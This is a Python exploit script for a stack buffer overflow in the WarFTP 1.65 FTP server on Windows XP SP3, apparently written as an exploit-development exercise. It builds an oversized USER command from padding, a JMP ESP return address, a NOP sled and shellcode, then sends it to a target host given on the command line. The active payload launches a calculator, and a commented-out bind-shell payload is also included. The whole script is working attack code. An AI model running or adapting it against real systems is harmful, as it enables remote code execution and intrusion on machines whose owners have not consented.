#! /usr/bin/python 
# Name: Rio Atmadja
# Program: Exploit Development warftp 1.65

import sys
import socket 

def fuzzing(hostname):

	#Target : Windows XP sp3
	#dll    : user32.dll 
	#ret    : 0x7e429353
	#badchar: '\x00\x0a\x0d' 

	#shellcode: windows/shell_bind_tcp  
#	shellcode = ("\xda\xcc\xbe\x2a\xb9\x9b\x8e\xd9\x74\x24\xf4\x58\x2b\xc9\xb1"
#	"\x56\x31\x70\x18\x03\x70\x18\x83\xc0\x2e\x5b\x6e\x72\xc6\x12"
#	"\x91\x8b\x16\x45\x1b\x6e\x27\x57\x7f\xfa\x15\x67\x0b\xae\x95"
#	"\x0c\x59\x5b\x2e\x60\x76\x6c\x87\xcf\xa0\x43\x18\xfe\x6c\x0f"
#	"\xda\x60\x11\x52\x0e\x43\x28\x9d\x43\x82\x6d\xc0\xab\xd6\x26"
#	"\x8e\x19\xc7\x43\xd2\xa1\xe6\x83\x58\x99\x90\xa6\x9f\x6d\x2b"
#	"\xa8\xcf\xdd\x20\xe2\xf7\x56\x6e\xd3\x06\xbb\x6c\x2f\x40\xb0"
#	"\x47\xdb\x53\x10\x96\x24\x62\x5c\x75\x1b\x4a\x51\x87\x5b\x6d"
#	"\x89\xf2\x97\x8d\x34\x05\x6c\xef\xe2\x80\x71\x57\x61\x32\x52"
#	"\x69\xa6\xa5\x11\x65\x03\xa1\x7e\x6a\x92\x66\xf5\x96\x1f\x89"
#	"\xda\x1e\x5b\xae\xfe\x7b\x38\xcf\xa7\x21\xef\xf0\xb8\x8e\x50"
#	"\x55\xb2\x3d\x85\xef\x99\x29\x6a\xc2\x21\xaa\xe4\x55\x51\x98"
#	"\xab\xcd\xfd\x90\x24\xc8\xfa\xd7\x1f\xac\x95\x29\x9f\xcd\xbc"
#	"\xed\xcb\x9d\xd6\xc4\x73\x76\x27\xe8\xa6\xd9\x77\x46\x18\x9a"
#	"\x27\x26\xc8\x72\x22\xa9\x37\x62\x4d\x63\x4e\xa4\x83\x57\x03"
#	"\x43\xe6\x67\xb2\xcf\x6f\x81\xde\xff\x39\x19\x76\xc2\x1d\x92"
#	"\xe1\x3d\x74\x8e\xba\xa9\xc0\xd8\x7c\xd5\xd0\xce\x2f\x7a\x78"
#	"\x99\xbb\x90\xbd\xb8\xbc\xbc\x95\xb3\x85\x57\x6f\xaa\x44\xc9"
#	"\x70\xe7\x3e\x6a\xe2\x6c\xbe\xe5\x1f\x3b\xe9\xa2\xee\x32\x7f"
#	"\x5f\x48\xed\x9d\xa2\x0c\xd6\x25\x79\xed\xd9\xa4\x0c\x49\xfe"
#	"\xb6\xc8\x52\xba\xe2\x84\x04\x14\x5c\x63\xff\xd6\x36\x3d\xac"
#	"\xb0\xde\xb8\x9e\x02\x98\xc4\xca\xf4\x44\x74\xa3\x40\x7b\xb9"
#	"\x23\x45\x04\xa7\xd3\xaa\xdf\x63\xe3\xe0\x7d\xc5\x6c\xad\x14"
#	"\x57\xf1\x4e\xc3\x94\x0c\xcd\xe1\x64\xeb\xcd\x80\x61\xb7\x49"
#	"\x79\x18\xa8\x3f\x7d\x8f\xc9\x15")
	
	#calculator
	shellcode = ("\xbb\xe1\xd3\xc4\x5c\xdd\xc1\xd9\x74\x24\xf4\x5e\x31\xc9\xb1"
	"\x33\x31\x5e\x12\x03\x5e\x12\x83\x27\xd7\x26\xa9\x5b\x30\x2f"
	"\x52\xa3\xc1\x50\xda\x46\xf0\x42\xb8\x03\xa1\x52\xca\x41\x4a"
	"\x18\x9e\x71\xd9\x6c\x37\x76\x6a\xda\x61\xb9\x6b\xea\xad\x15"
	"\xaf\x6c\x52\x67\xfc\x4e\x6b\xa8\xf1\x8f\xac\xd4\xfa\xc2\x65"
	"\x93\xa9\xf2\x02\xe1\x71\xf2\xc4\x6e\xc9\x8c\x61\xb0\xbe\x26"
	"\x6b\xe0\x6f\x3c\x23\x18\x1b\x1a\x94\x19\xc8\x78\xe8\x50\x65"
	"\x4a\x9a\x63\xaf\x82\x63\x52\x8f\x49\x5a\x5b\x02\x93\x9a\x5b"
	"\xfd\xe6\xd0\x98\x80\xf0\x22\xe3\x5e\x74\xb7\x43\x14\x2e\x13"
	"\x72\xf9\xa9\xd0\x78\xb6\xbe\xbf\x9c\x49\x12\xb4\x98\xc2\x95"
	"\x1b\x29\x90\xb1\xbf\x72\x42\xdb\xe6\xde\x25\xe4\xf9\x86\x9a"
	"\x40\x71\x24\xce\xf3\xd8\x22\x11\x71\x67\x0b\x11\x89\x68\x3b"
	"\x7a\xb8\xe3\xd4\xfd\x45\x26\x91\xf2\x0f\x6b\xb3\x9a\xc9\xf9"
	"\x86\xc6\xe9\xd7\xc4\xfe\x69\xd2\xb4\x04\x71\x97\xb1\x41\x35"
	"\x4b\xcb\xda\xd0\x6b\x78\xda\xf0\x0f\x1f\x48\x98\xe1\xba\xe8"
	"\x3b\xfe")

	ret    = "\x53\x93\x42\x7E"  #7E429353 JMP ESP
	password = "user"
	username = '\x41' * 246 + ret + '\x90' * 16  + shellcode 
	connect = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

	try:
		#connect to the host 
		connect.connect((hostname, 21))

	except:

		print "[-] Connection Error"
		response = connect.recv(2000)
		print response
		sys.exit(1)

	#send username to the server 
	connect.send("user %s\r\n" %username)
	response = connect.recv(2000)
	print response 

	#send password to the server 
	connect.send("pass %s\r\n" %password)
	response = connect.recv(2000)
	print response 

	connect.close()

if __name__ == '__main__':
	try:
		target = sys.argv[1]
	except IndexError:
		print 'Usage: %s <target>' % sys.argv[0]
		sys.exit(-1)
	
	fuzzing(target)
